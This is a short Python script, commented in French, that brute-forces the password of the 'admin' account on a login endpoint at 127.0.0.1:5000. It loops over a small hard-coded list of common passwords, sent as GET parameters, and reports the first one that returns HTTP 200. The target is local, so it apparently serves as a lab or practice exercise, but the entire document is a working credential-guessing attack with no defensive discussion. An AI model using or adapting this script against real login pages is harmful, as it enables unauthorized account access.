import requests

url = "http://127.0.0.1:5000/login"
username = "admin"

# Wordlist basique
passwords = ["azerty", "password", "123456", "1234", "admin", "qwerty", "letmein"]

print(f"Brute-force sur {username}...\n")

for password in passwords:
    response = requests.get(url, params={"username": username, "password": password})
    print(f"Essai : {password} → {response.status_code}")
    if response.status_code == 200:
        print(f"\nMot de passe : {password}")
        break